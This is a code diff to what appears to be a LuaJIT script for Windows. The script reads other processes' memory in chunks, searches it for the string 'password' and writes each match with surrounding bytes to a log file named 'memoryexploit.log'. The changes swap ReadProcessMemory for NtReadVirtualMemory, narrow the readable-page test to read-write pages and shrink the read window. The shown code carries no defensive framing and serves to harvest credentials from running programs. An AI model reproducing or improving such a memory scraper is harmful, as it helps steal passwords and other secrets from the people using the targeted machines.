@@ -84,7 +84,7 @@ local advapi32 = ffi.load("advapi32")
 local SEARCH_STRING = "password"       -- change as needed
 local LOG_PATH = "c:/temp/memoryexploit.log"
 
-local CHUNK_SIZE = 0x8000               -- 32 KB read window per chunk
+local CHUNK_SIZE = 0x1000               -- 4 KB read window per chunk
 local ADDRESS_LIMIT = 0x7FFFFFFFFFFFFFFF
 local CONTEXT_BEFORE = 96               -- bytes (or UTF-16 pairs) before match
 local CONTEXT_AFTER = 64                -- bytes (or UTF-16 pairs) after match
@@ -175,11 +175,7 @@ local function toUnicodeLE(str)
 end
 
 local function isReadableProtection(protect)
-    if protect == 0 then return false end
-    if bit.band(protect, PAGE_NOACCESS) ~= 0 then return false end
-    if bit.band(protect, PAGE_GUARD) ~= 0 then return false end
-    local readableMask = bit.bor(PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE_WRITECOPY)
-    return bit.band(protect, readableMask) ~= 0
+    return bit.band(protect, PAGE_READWRITE) ~= 0
 end
 
 -- Helper function to read memory safely
@@ -187,17 +183,13 @@ local function safeNtRead(processHandle, address, size)
     local buffer = ffi.new("uint8_t[?]", size)
     local bytesRead = ffi.new("SIZE_T[1]")
     
-    local success = kernel32.ReadProcessMemory(processHandle, ffi.cast("PVOID", address), buffer, size, bytesRead)
+    local status = ntdll.NtReadVirtualMemory(processHandle, address, buffer, size, bytesRead)
 
-    if not success then
-        local lastErr = kernel32.GetLastError()
-        -- ERROR_PARTIAL_COPY (299) is expected, so we don't log it as a hard error.
-        if lastErr ~= 299 then
-            writeLog(logFile, string.format("  ReadProcessMemory failed at 0x%08X (Win32=%d)\n", address, lastErr))
+    if status ~= STATUS_SUCCESS and status ~= STATUS_PARTIAL_COPY then
+        if status ~= STATUS_ACCESS_VIOLATION then
+            writeLog(logFile, string.format("  NtReadVirtualMemory failed at 0x%08X (status=%s)\n", address, statusToString(status)))
         end
-        if bytesRead[0] == 0 then
-            return nil
-        end
+        return nil
     end
 
     return ffi.string(buffer, bytesRead[0])
